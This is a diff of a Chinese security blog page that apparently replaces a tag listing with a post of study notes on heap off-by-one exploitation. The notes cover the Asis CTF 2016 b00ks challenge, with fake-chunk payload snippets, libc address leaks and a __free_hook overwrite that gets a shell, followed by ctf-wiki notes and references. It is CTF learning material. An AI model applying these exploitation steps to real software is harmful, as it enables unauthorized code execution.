@@ -5,8 +5,6 @@
   <!-- SEO相关 -->
   
     
-      <meta name="robots" content="noindex,follow">
-    
   
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
@@ -21,7 +19,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>Tag: 文件包含 - 虽然没什么用但还是想记下来</title>
+  <title>堆利用三之offbyone⌛️ - 虽然没什么用但还是想记下来</title>
   
 
   
@@ -307,7 +305,7 @@
     <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper  dock' style="display: none;">
+        <div id="full" class='cover-wrapper 堆利用三之offbyone dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg"></div>
           
@@ -375,76 +373,199 @@
       <div class='body-wrapper' id="pjax-container">
         
 
-
 <div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-堆利用三之offbyone" id="堆利用三之offbyone" itemscope itemprop="blogPost">
   
+
+
+  
+  <div class="article-meta" id="top">
     
-      
-  <section class="post-list">
     
-      
+    
+      <h1 class="title">
+        堆利用三之offbyone⌛️
+      </h1>
+      <div class='new-meta-box'>
         
           
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>请设置文章作者</p>
+  </a>
+</div>
+
+          
         
-      
-    
-    
-      
+          
+            
+
+          
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2020/10/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-        文件包含⌛️
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Feb 2, 2021</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
       
-        0x00 文件包含的基础知识文件包含的概念服务器执行PHP代码时，可以通过文件包含函数将文件包含进来，使用包含文件的代码。它的目的是更好地使用代码的重用性，简化开发流程，因为可以创建一个模板，在其他情况下重复使用。(其实除了PHP，Java、python里面都有文件包含的概念，Java–包，python–模块，import)
-文件包含函数PHP中的文件包含函数有四个
-require() 
-r...
-      
-    
+      <div id="lc-pv" data-title="堆利用三之offbyone⌛️" data-path="/2021/02/02/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boff%20by%20one/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2020-10-19</time>
+
+
+          
         
       </div>
+    
+  </div>
+
+
+  
+  <p>本文主要记录阅读一些文章时的笔记及总结</p>
+<h1 id="一、Asis-CTF-2016-b00ks-wp-null-off-by-one-【详】"><a href="#一、Asis-CTF-2016-b00ks-wp-null-off-by-one-【详】" class="headerlink" title="一、Asis CTF 2016 b00ks wp (null off-by-one)【详】"></a>一、Asis CTF 2016 b00ks wp (null off-by-one)【详】</h1><p>文章地址 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/56acd25fd02a">https://www.jianshu.com/p/56acd25fd02a</a></p>
+<p>先看一道例题 b00ks。</p>
+<p>漏洞的位置是输入名字那里。调试的时候输入的name为’a’*30+’bc’。</p>
+<p>然后pwndbg中search abc。</p>
+<p>![截屏2021-02-02 上午11.26.44](/Users/my/Library/Application Support/typora-user-images/截屏2021-02-02 上午11.26.44.png)</p>
+<p>构造堆块1</p>
+<p>![C6612D39-893D-4DC0-BB6C-27AF792577FA](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/C6612D39-893D-4DC0-BB6C-27AF792577FA.png)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createbook(<span class="number">150</span>, <span class="string">&quot;kkbook1&quot;</span>, <span class="number">0x100</span>, <span class="string">&quot;haha&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>存放name和description的内存结构如下</p>
+<p>![截屏2021-02-03 下午3.29.07](/Users/my/Library/Application Support/typora-user-images/截屏2021-02-03 下午3.29.07.png)</p>
+<p>edit1号块的时候，是从discription开始写的。</p>
+<p>用print输出book1，就会得到book1的地址。</p>
+<p><code>book1_addr ==&gt; 0x5555557581d0</code></p>
+<p>在book1中构造一个fake_chunk。使fake_book1_name指向book2_des，fake_book1_des指向book2_des。book1_des的地址是 0x5555557580c0</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x40</span> + p64(<span class="number">0x01</span>) + p64(book1_addr + <span class="number">0x40</span>) + p64(book1_addr + <span class="number">0x38</span>) + p64(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>
+
+<p>![image-20210203163134627](/Users/my/Library/Application Support/typora-user-images/image-20210203163134627.png)</p>
+<p>接下来我们修改作者，溢出，使得book1变为我们构造的fake_book1。</p>
+<p>![image-20210203171523782](/Users/my/Library/Application Support/typora-user-images/image-20210203171523782.png)</p>
+<p>![image-20210203171656790](/Users/my/Library/Application Support/typora-user-images/image-20210203171656790.png)</p>
+<p>计算基址：</p>
+<p>mmap分配的地址如下</p>
+<p>![截屏2021-02-03 下午5.34.15](/Users/my/Library/Application Support/typora-user-images/截屏2021-02-03 下午5.34.15.png)</p>
+<p>libc的地址如下</p>
+<p>![截屏2021-02-03 下午5.30.06](/Users/my/Library/Application Support/typora-user-images/截屏2021-02-03 下午5.30.06.png)</p>
+<p><code>offset = book2_name_addr - 0x00007ffff7a0d000 = 0x4da010</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x7ffff7a0d000</span> <span class="number">0x00007ffff7ee7010</span></span><br><span class="line">0x7ffff7a0d000-&gt;0x7ffff7ee7010 is 0x4da010 bytes (0x9b402 words)</span><br></pre></td></tr></table></figure>
+
+<p>自己设置的加载基址是不变的，但是本题开启了PIE，每次基址都是不同的，所以需要算一下。</p>
+<p>接下来泄漏一些重要函数的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">free_hook_addr = libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).next()</span><br><span class="line"></span><br><span class="line">----</span><br><span class="line"></span><br><span class="line">book2_name_addr ==&gt; 0x7ffff7ee7010</span><br><span class="line">book2_des_addr ==&gt; 0x7ffff7918010</span><br><span class="line">libc_base ==&gt; 0x7ffff7a0d000</span><br><span class="line">free_hook_addr ==&gt; 0x7ffff7dd37a8</span><br><span class="line">system_addr ==&gt; 0x7ffff7a0d000</span><br><span class="line">binsh_addr ==&gt; 0x7ffff7b99e17</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>记录一下内存结构</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#起始</span></span><br><span class="line"><span class="number">0x55555575605d</span><span class="number">-0x35</span>+<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#堆块1</span></span><br><span class="line">0x00005555557581d0---&gt;0x0000555555758100</span><br><span class="line"><span class="comment">#堆块1-description</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x0000555555758100</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x555555758100</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x555555758108</span> —▸ <span class="number">0x555555758210</span> —▸ <span class="number">0x7ffff7918010</span> ◂— <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x555555758110</span> —▸ <span class="number">0x555555758208</span> —▸ <span class="number">0x7ffff7ee7010</span> ◂— <span class="number">0x326b6f6f626b6b</span> /* <span class="string">&#x27;kkbook2&#x27;</span> */</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x555555758118</span> ◂— <span class="number">0xffff</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x555555758120</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="meta">... </span>↓</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>![image-20210203191301804](/Users/my/Library/Application Support/typora-user-images/image-20210203191301804.png)</p>
+<p>此时edit 1号块，就会修改1的description部分，即跳转到堆块2的name部分。</p>
+<p>![image-20210203202233931](/Users/my/Library/Application Support/typora-user-images/image-20210203202233931.png)</p>
+<p>再edit 2号块，修改的是2号块的des </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">editbook(<span class="number">2</span>, p64(system_addr))</span><br></pre></td></tr></table></figure>
+
+<p>![截屏2021-02-03 下午8.26.36](/Users/my/Library/Application Support/typora-user-images/截屏2021-02-03 下午8.26.36.png)</p>
+<p>ida中查看free函数</p>
+<p>![image-20210204120209952](/Users/my/Library/Application Support/typora-user-images/image-20210204120209952.png)</p>
+<p>free了3个指针，2号堆块的name处存放的是 /bin/sh，des处存放的是free_hook。<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38204481/article/details/81320898">此篇文章</a> 中说了 __free_hook函数在内存中前面紧挨的是它的参数，所以要把2号块的name处放/bin/sh。free_hook前面就是/bin/sh。</p>
+<p>所以free(2)，就会执行system(/bin/sh)，即可getshell。</p>
+<p>![截屏2021-02-03 下午8.54.36](/Users/my/Library/Application Support/typora-user-images/截屏2021-02-03 下午8.54.36.png)</p>
+<p>参考的文章<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/56acd25fd02a">https://www.jianshu.com/p/56acd25fd02a</a> 中，</p>
+<p>![A005129A-8EFB-4255-B80F-8C7BEDB9F28C](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/A005129A-8EFB-4255-B80F-8C7BEDB9F28C.png)</p>
+<p>如果这个计算是正确的话，也就是说，指针原本指向的就是name区域？</p>
+<p>还参考了如下文章</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41918771/article/details/101347234">初探off-by-one之Asis CTF 2016 b00ks</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33528164/article/details/79778690?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-5.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-5.control">Asis CTF 2016 b00ks</a></p>
+<p><a target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/521">__free_hook 劫持原理</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/08/22/5d5def6881498/">off by one 利用原理</a></p>
+<h1 id="二、ctf-wiki"><a href="#二、ctf-wiki" class="headerlink" title="二、ctf-wiki"></a>二、ctf-wiki</h1><p>文章地址 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/glibc-heap/off_by_one/">https://ctf-wiki.org/pwn/linux/glibc-heap/off_by_one/</a></p>
+<p>1、示例一运行失败，最多只能覆盖16字节，当传入17个字节时，会报错。可能是加入了一些检查机制。</p>
+<p>![90E77DE9-8FDA-4E2A-9E52-B688637305B4](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/90E77DE9-8FDA-4E2A-9E52-B688637305B4.png)</p>
+<p>2、题目2—plaidctf 2015 plaiddb</p>
+<p>第一题看懂了，看题目2。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnhackhy.com/45802.html">https://www.cnhackhy.com/45802.html</a></p>
+<p>利用思路：</p>
+<ol>
+<li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li>
+<li>溢出字节为 NULL 字节：在 size 为 0x100 （？？？？？只能0x00？？？）的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/glibc-heap/off_by_one/">https://ctf-wiki.org/pwn/linux/glibc-heap/off_by_one/</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-225611.htm">https://bbs.pediy.com/thread-225611.htm</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38204481/article/details/81320898">https://blog.csdn.net/qq_38204481/article/details/81320898</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33528164/article/details/79778690">https://blog.csdn.net/qq_33528164/article/details/79778690</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11768032.html#%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF">https://www.cnblogs.com/luoleqi/p/11768032.html#%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/171261.html">https://www.freebuf.com/articles/network/171261.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://t.zoukankan.com/jourluohua-p-8994209.html">http://t.zoukankan.com/jourluohua-p-8994209.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/nashi_ko/article/details/110351289">https://blog.csdn.net/nashi_ko/article/details/110351289</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hac425/p/9993716.html">https://www.cnblogs.com/hac425/p/9993716.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112365397">https://zhuanlan.zhihu.com/p/112365397</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv5380502/">https://www.bilibili.com/read/cv5380502/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/208407#h2-12">https://www.anquanke.com/post/id/208407#h2-12</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43409582/article/details/109825038">https://blog.csdn.net/qq_43409582/article/details/109825038</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/171283">https://www.anquanke.com/post/id/171283</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/92335.html">https://www.secpulse.com/archives/92335.html</a></p>
+
+  
+  
+  
+  
+
+  
+    <div class="prev-next">
       
-        <div>
-          <a class='readmore' href='/2020/10/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/'>
-            Read More
-          </a>
-        </div>
+        <a class='prev' href='/2021/02/03/%E5%9F%BA%E4%BA%8ELSTM%E6%A8%A1%E5%9E%8B%E7%9A%84DNS%E9%9A%90%E8%94%BD%E4%BF%A1%E9%81%93%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>基于LSTM模型的DNS隐蔽信道检测方法</p>
+          <p class='content'>本文发表于Computers &amp; Security，作者来自于北航、软件所、应急响应技术中心，发表时间2020年10月。
+一、背景及目的1、DNS(域名系统)作用是将域名转为IP地址。防...</p>
+        </a>
+      
+      
+        <a class='next' href='/2021/01/25/%E6%81%B6%E6%84%8FURL%E4%B8%89/'>
+          <p class='title'>恶意URL检测(三)文章总结⌛️<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>此文是关于两篇文章的总结
+一第一篇：https://www.fireeye.com/blog/threat-research/2021/01/training-transformers-for-...</p>
+        </a>
       
     </div>
   
+</article>
 
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
 </div>
 
-          </div>
-        
-      
-    
-  </section>
-  
-    
-  
+  </article>
 
 
-    
-  
+
+
+
+
 </div>
 <aside class='l_side'>
   
@@ -452,141 +573,28 @@ r...
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">虽然没什么用但还是想记下来</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
 
-  
-    
-    
-  
-
-  <section class="widget category shadow desktop">
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
     
   <header>
     
-      <a href='/blog/categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
     
   </header>
 
 
     <div class='content'>
-      <ul class="entry navigation">
         
-          <li><a class="flat-box"
-            title="/categories/paper%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" href="/categories/paper%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"
-            id="categoriespaperE99885E8AFBBE7AC94E8AEB0"
-            ><div class='name'>paper阅读笔记</div><div class='badge'>(4)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/web/" href="/categories/web/"
-            id="categoriesweb"
-            ><div class='name'>web</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"
-            id="categoriesE4BA8CE8BF9BE588B6"
-            ><div class='name'>二进制</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E6%9D%82%E8%AE%B0/" href="/categories/%E6%9D%82%E8%AE%B0/"
-            id="categoriesE69D82E8AEB0"
-            ><div class='name'>杂记</div><div class='badge'>(2)</div></a></li>
-        
-      </ul>
     </div>
   </section>
 
-
-  
-
-  
-    
-    
-  
-
-  <section class="widget tagcloud shadow desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/DNS%E6%A3%80%E6%B5%8B/" style="font-size: 14px; color: #999">DNS检测</a> <a href="/tags/DoH/" style="font-size: 14px; color: #999">DoH</a> <a href="/tags/ML-DL/" style="font-size: 14px; color: #999">ML&DL</a> <a href="/tags/edge-AI/" style="font-size: 14px; color: #999">edge AI</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 14px; color: #999">sql注入</a> <a href="/tags/unlink/" style="font-size: 14px; color: #999">unlink</a> <a href="/tags/url%E6%A3%80%E6%B5%8B/" style="font-size: 14px; color: #999">url检测</a> <a href="/tags/web/" style="font-size: 24px; color: #555">web</a> <a href="/tags/%E6%81%B6%E6%84%8FURL%E6%A3%80%E6%B5%8B/" style="font-size: 14px; color: #999">恶意URL检测</a> <a href="/tags/%E6%81%B6%E6%84%8Furl%E6%A3%80%E6%B5%8B/" style="font-size: 14px; color: #999">恶意url检测</a> <a href="/tags/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B/" style="font-size: 14px; color: #999">恶意软件检测</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 14px; color: #999">文件包含</a> <a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 14px; color: #999">机器学习</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 14px; color: #999">生活</a> <a href="/tags/%E9%A1%B6%E4%BC%9ASP/" style="font-size: 14px; color: #999">顶会SP</a>
-    </div>
-  </section>
-
-
-  
 
   
 
 
 </aside>
+
 
 
         
